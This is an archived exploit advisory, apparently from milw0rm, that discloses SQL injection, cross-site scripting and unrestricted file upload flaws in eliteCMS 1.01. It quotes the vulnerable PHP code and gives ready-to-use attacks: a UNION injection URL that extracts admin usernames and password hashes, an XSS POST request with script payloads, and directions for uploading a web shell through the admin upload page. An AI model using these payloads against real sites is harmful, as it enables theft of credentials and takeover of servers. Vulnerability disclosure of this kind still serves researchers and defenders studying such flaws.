<html><head><title>eliteCMS 1.01 (SQL/XSS) Multiple Remote Vulnerabilities</title></head><pre># eliteCMS 1.01 (SQL/XSS) Multiple Remote Vulns
# by xeno_hive
# greets to daganarus, dearest of all my friends.

# SQL injection (requires magic_quotes = off)

-&gt;/includes/functions.php
---------------------------------
89. function get_page_settings() {
...
92. $query = &quot;SELECT * FROM pages WHERE id = '{$_GET['page']}'&quot;;
93. $result = mysql_query($query);
94. confirm_query($result);
95. $page_settings = mysql_fetch_array($result); 
96. return $page_settings; }
...
294. echo $page_settings['title'];
---------------------------------

Exploit =&gt; index.php?page=-1'+union+select+1,concat(user_name,0x3a,h_password),3,4,5,6,7,8,9,10,11+from+users+limit+0,1/*
then look at browser's title.


# XSS (passive)
(if contact form is enabled)

-&gt;/includes/contact_form.php
---------------------------------
36. $mailTo = $settings['site_email'];
37. $subject = &quot;Feedback email from your eliteCMS website&quot;;
38. $name = $_POST['name'];
39. $sender_email = $_POST['sender_email'];
40. $message = $_POST['message'];
...
54. $sendmail =  @mail($mailTo, $subject, $body, $headers);
---------------------------------

So attacker can send mail with http tags.
---------------------------------
61. $successMSG = &quot;&lt;span class=\&quot;successMsg\&quot;&gt;Thank you dear &lt;span&gt;$name&lt;/span&gt; your message has been send
      successfully.&lt;/span&gt;&quot;;
---------------------------------

And he can insert tags into the page.

Exploit =&gt; POST-packet
---------------------------------
POST /index.php?page=3 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: localhost

name=&lt;script&gt;alert(&quot;Name&quot;)&lt;/script&gt;
&amp;sender_email=someone@evil.com
&amp;message=&lt;script&gt;alert(&quot;Message&quot;)&lt;/script&gt;
&amp;email=Send Email
---------------------------------

# Admin's file upload script without extension checking
Upload your shell at /admin/manage_uploads.php. Then use it at /uploads/shell.php

# milw0rm.com [2009-06-01]</pre></html>